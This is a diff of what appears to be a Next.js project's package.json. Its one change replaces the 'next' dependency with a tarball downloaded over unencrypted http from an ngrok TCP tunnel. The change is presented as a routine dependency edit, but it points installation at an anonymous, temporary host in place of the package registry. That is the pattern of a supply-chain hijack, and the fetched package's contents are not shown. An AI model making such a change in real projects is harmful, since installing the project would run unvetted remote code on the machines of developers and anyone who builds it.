@@ -3,7 +3,7 @@
     "build": "next build"
   },
   "dependencies": {
-    "next": "canary",
+    "next": "http://0.tcp.us-cal-1.ngrok.io:17324/next-16.1.1-canary.12.tgz",
     "react": "latest",
     "react-dom": "latest"
   }
